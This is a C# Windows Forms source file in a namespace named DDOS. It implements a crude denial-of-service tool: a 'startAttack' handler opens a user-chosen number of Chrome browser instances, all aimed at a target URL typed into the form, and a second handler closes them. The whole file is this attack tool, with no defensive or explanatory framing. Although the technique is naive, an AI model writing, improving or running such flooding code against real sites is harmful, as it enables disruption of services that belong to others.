using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;


namespace DDOS
{
    public partial class Form1 : Form
    {
        /*
        private Process fireFox;
        */
        
        private int[] processesIDs;
        private Process[] running;
        public Form1()
        {
            InitializeComponent();
        }
        
        private void startAttack_Click(object sender, EventArgs e)
        {
            String url = targetUrl.Text;
            String num = numOfBrowsers.Text;
            
            processesIDs = new int[int.Parse(num)];
            running = new Process[int.Parse(num)];
            
            for (int i = 0; i < int.Parse(num); i++)
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = "chrome.exe",
                    Arguments = url,
                };
                running[i] = Process.Start(startInfo);
                /*Process fireFox = Process.Start(startInfo);
                processesIDs[i] = fireFox.Id;
                running[i] = fireFox;*/
            }
        }

        private void close_Click(object sender, EventArgs e)
        {
            foreach (Process process in running)
            {
                try
                {
                    process.CloseMainWindow();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error closing window for process {process.ProcessName}: {ex.Message}");
                }
            }
        
        }

        private void numOfBrowsers_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void targetUrl_TextChanged(object sender, EventArgs e)
        {
            
        }
    }
}